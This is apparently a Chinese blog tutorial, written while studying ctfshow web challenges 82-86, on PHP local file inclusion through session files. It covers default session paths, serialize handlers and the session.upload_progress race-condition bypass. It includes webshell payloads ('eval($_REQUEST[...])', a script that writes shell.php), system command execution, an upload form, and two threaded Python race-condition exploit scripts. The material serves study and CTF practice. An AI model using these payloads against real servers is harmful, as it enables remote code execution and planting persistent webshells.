---
title: LFI绕过Session包含限制
categories: web漏洞
---

## 前言
在学习本地包含漏洞过程中，包含session漏洞，个人感觉比较复杂，在此理一下思路

---
## 用户会话
在了解session包含文件漏洞及绕过姿势的时候，我们应该首先了解一下服务器上针对用户会话session的存储与处理是什么过程，只有了解了其存储和使用机制我们才能够合理的去利用它得到我们想要的结果。
<!--more-->
  一、会话储存

 1. 存储方式
	`Java`是将用户的session存入内存中，而`PHP`则是将session以文件的形式存储在服务器某个文件中，可以在php.ini里面设置session的存储位置`session.save_path`。
	
	![](https://img-blog.csdnimg.cn/20210128025535147.png#pic_center)
	知道session的存储后，总结常见的php-session默认存放位置是很有必要的，因为在很多时候服务器都是按照默认设置来运行的，这个时候假如我们发现了一个没有安全措施的session包含漏洞就可以尝试利用默认的会话存放路径去包含利用。
 2. 默认路径
>/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
 3. 命名格式
如果某个服务器存在session包含漏洞，要想去成功的包含利用的话，首先必须要知道的是服务器是如何存放该文件的，只要知道了其命名格式我们才能够正确的去包含该文件。
session的文件名格式为`sess_[phpsessid]`。而phpsessid在发送的请求的`cookie字段中`可以看到。

![](https://img-blog.csdnimg.cn/20210128025905602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

 4. 会话处理
在了解了用户会话的存储下来就需要了解php是如何处理用户的会话信息。php中针对用户会话的处理方式主要取决于服务器在php.ini或代码中对`session.serialize_handler`的配置。
>session.serialize_handler = php           一直都在(默认方式)  它是用 |分割

>session.serialize_handler = php_serialize  php5.5之后启用 它是用serialize反序列化格式分割

区分：

- session.serialize_handler=php

默认session.serialize_handler=php处理模式只对用户名的内容进行了序列化存储，没有对变量名进行序列化，可以看作是服务器对用户会话信息的半序列化存储过程。


![](https://img-blog.csdnimg.cn/20210128030149734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

- session.serialize_handler=php_serialize

看到session.serialize_handler=php_serialize处理模式，对整个session信息包括文件名、文件内容都进行了序列化处理，可以看作是服务器对用户会话信息的完全序列化存储过程。

![](https://img-blog.csdnimg.cn/20210128030249131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
 ## LFI Session
 LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如Session会话文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。

简单的理解session文件包含漏洞就是在用户可以控制session文件中的一部分信息，然后将这部分信息变成我们的精心构造的恶意代码，之后去包含含有我们传入恶意代码的这个session文件就可以达到攻击效果。

简单示例（无限制）：
session.php（session文件）

```bash
<?php
 	session_start();
    $username = $_POST['username'];
    $_SESSION["username"] = $username;
?>
```
index.php(包含利用)

```bash
<?php
	
	$file  = $_GET['file'];
    include($file);
?>
```

漏洞利用：
对username没有限制，对其传入恶意代码；

```bash
http://192.33.6.145/FI/session/session.php

POST
username=<?php eval($_REQUEST[Qftm]);?>
```
![](https://img-blog.csdnimg.cn/20210128032122783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
同时修改cookie内容，sessionid

payload：

```bash
PHPSESSID：7qefqgu07pluu38m45isiesq3s

index.php?file=/var/lib/php/sessions/sess_7qefqgu07pluu38m45isiesq3s

POST
Qftm=system('whoami');
```
![执行成功](https://img-blog.csdnimg.cn/20210128032316309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
成功执行

以上为理想化漏洞实现

---
## 包含限制情况

- **No session_start()**

一般情况下，session_start()作为会话的开始出现在用户登录等地方以维持会话。

但是，如果一个站点存在LFI漏洞，却没有用户会话那么该怎么去包含session信息呢。

这个时候我们就要想想系统内部本身有没有什么地方可以直接帮助我们产生session并且一部分数据是用户可控的，很意外的是这种情况存在，下面分析一下怎么去利用。

默认情况下，`session.use_strict_mode`值是0，此时用户是可以`自己定义`Session ID的。比如，我们在`Cookie里`设置PHPSESSID=Qftm，PHP将会在服务器上创建一个文件：/var/lib/php/sessions/sess_Qftm。
但这个技巧的实现要满足一个条件：服务器上需要已经初始化Session。 在PHP中，通常初始化Session的操作是`执行session_start()`。那么，如果一个网站没有执行这个初始化的操作，是不是就不能在服务器上创建文件了呢？很意外是可以的。下面看一下php.ini里面关键的几个配置项
（即`初始化后`才能设置sessionid）

![](https://img-blog.csdnimg.cn/20210128034012974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
`session.auto_start`：顾名思义，如果开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，也是通常情况下，这个选项都是关闭的。

`session.upload_progress.cleanup = on`：默认开启这个选项，表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要。

`session.upload_progress.name` = `"PHP_SESSION_UPLOAD_PROGRESS"`：当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时（这部分数据用户可控），上传进度可以在SESSION中获得。当PHP检测到这种POST请求时，它会在SESSION中添加一组数据（系统自动初始化session）, 索引是session.upload_progress.prefix与session.upload_progress.name连接在一起的值。

`session.upload_progress`：php>=5.4添加的。最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中（包含用户可控的值），即使此时用户没有初始化Session，PHP也会自动初始化Session。 而且，默认情况下session.upload_progress.enabled是为On的，也就是说这个特性默认开启。那么，如何利用这个特性呢？

```bash
<!DOCTYPE html>
<html>
<body>
<form action="ip地址" method="POST" enctype="multipart/form-data">
<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="2333" />
<input type="file" name="file" />
<input type="submit" value="submit" />
</form>
</body>
</html>
<?php
session_start();
?>
```


![冷静冷静](https://img-blog.csdnimg.cn/20210128034647694.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
分析：
>从官方的案例和结果可以看到session中一部分数据(`session.upload_progress.name`)是用户自己可以控制的。那么我们只要上传文件的时候，在Cookie中`设置PHPSESSID`=Qftm(默认情况下session.use_strict_mode=0用户可以自定义Session ID),同时POST一个恶意的字段PHP_SESSION_UPLOAD_PROGRESS,(`PHP_SESSION_UPLOAD_PROGRESS在session.upload_progress.name中定义`),只要上传包里带上这个键，PHP就会自动启用Session，同时，我们在Cookie中设置了PHPSESSID=Qftm，所以Session文件将会自动创建。

>事实上并不能完全的利用成功，因为`session.upload_progress.cleanup = on`这个默认选项会有限制，当文件上传结束后，php将会立即清空对应session文件中的内容，这就导致我们在包含该session的时候相当于在包含一个空文件，没有包含我们传入的恶意代码。不过，我们只需要条件竞争，赶在文件被清除前利用即可。

---
梳理：(详细操作看ctfshow web入门 82-86)

- upload file
>files={'file': ('a.txt', "xxxxxxx")}
- 设置cookie PHPSESSID
>session.use_strict_mode=0造成Session ID可控
PHPSESSID=Qftm
- POST一个字段PHP_SESSION_UPLOAD_PROGRESS
>session.upload_progress.name="PHP_SESSION_UPLOAD_PROGRESS"，在session中可控，同时，触发系统初始化session
"PHP_SESSION_UPLOAD_PROGRESS":  比如 '<?php phpinfo();?>'
- session.upload_progress.cleanup = on
>多线程，时间竞争
---
攻击：
1.表单利用攻击

```bash
<!doctype html>
<html>
<body>
<form action="http://192.33.6.145/index.php" method="post" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" vaule="<?php phpinfo(); ?>" />
    <input type="file" name="file1" />
    <input type="file" name="file2" />
    <input type="submit" />
</form>
</body>
</html>
```
但是同样需要注意的是，cleanup是on，所以需要条件竞争，使用BP抓包，一遍疯狂发包，一遍疯狂请求。

![](https://img-blog.csdnimg.cn/20210128040139525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
代理拦截我们的上传请求数据包，这里需要设置Cookie: PHPSESSID=123456789（自定义sessionID），然后不断发包（请求载荷设置Null payloads），不断生成session，传入恶意会话。

再不断发出请求包含恶意session
![](https://img-blog.csdnimg.cn/2021012804031588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
请求载荷设置Null payloads

在一端不断发包维持恶意session存储的时候，另一端不断发包请求包含恶意的session

---
2.脚本攻击

```bash
import io
import sys
import requests
import threading

sessid = 'Qftm'

def POST(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        session.post(
            'http://192.33.6.145/index.php',
            data={"PHP_SESSION_UPLOAD_PROGRESS":"<?php phpinfo();fputs(fopen('shell.php','w'),'<?php @eval($_POST[mtfQ])?>');?>"},
            files={"file":('q.txt', f)},
            cookies={'PHPSESSID':sessid}
        )

def READ(session):
    while True:
        response = session.get(f'http://192.33.6.145/index.php?file=../../../../../../../../var/lib/php/sessions/sess_{sessid}')
        # print('[+++]retry')
        # print(response.text)

        if 'flag' not in response.text:
            print('[+++]retry')
        else:
            print(response.text)
            sys.exit(0)

with requests.session() as session:
    t1 = threading.Thread(target=POST, args=(session, ))
    t1.daemon = True
    t1.start()

    READ(session)
```

```bash
# -*- coding: utf-8 -*-
# @author:lonmar
import io
import requests
import threading

sessID = 'flag'
url = 'http://7920d625-4983-43eb-9d4f-335e57303fd0.chall.ctf.show/'


def write(session):
    while event.isSet():
        f = io.BytesIO(b'a' * 1024 * 50)
        response = session.post(
            url,
            cookies={'PHPSESSID': sessID},
            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("cat *.php");?>'},
            files={'file': ('test.txt', f)}
        )


def read(session):
    while event.isSet():
        response = session.get(url + '?file=/tmp/sess_{}'.format(sessID))
        if 'test' in response.text:
            print(response.text)
            event.clear()
        else:
            print('[*]retrying...')


if __name__ == '__main__':
    event = threading.Event()
    event.set()
    with requests.session() as session:
        for i in range(1, 30):
            threading.Thread(target=write, args=(session,)).start()

        for i in range(1, 30):
            threading.Thread(target=read, args=(session,)).start()
```

- Session Base64Encode
具体涉及到base64原理
详见参考

---

## 参考
[session包含漏洞](https://www.anquanke.com/post/id/201177#h2-8)

